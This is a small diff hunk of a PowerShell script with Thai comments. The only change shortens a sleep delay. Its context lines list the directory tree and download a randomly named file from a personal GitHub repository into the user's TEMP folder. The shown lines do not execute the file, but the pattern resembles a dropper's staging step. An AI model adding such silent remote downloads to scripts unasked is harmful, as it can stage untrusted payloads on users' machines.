@@ -13,7 +13,7 @@ Start-Sleep -Seconds 5  # หน่วงเวลานาน 5 วินาท
 
 tree /A /F
 
-Start-Sleep -Seconds 3
+Start-Sleep -Seconds 2
 
 # ดาวน์โหลดไฟล์จาก URL และบันทึกไปที่ temp/t.txt
 Invoke-WebRequest -Uri "https://github.com/nickfour/Service7/raw/main/zpcypx.txt" -OutFile "$env:TEMP\zpzpp.txt"
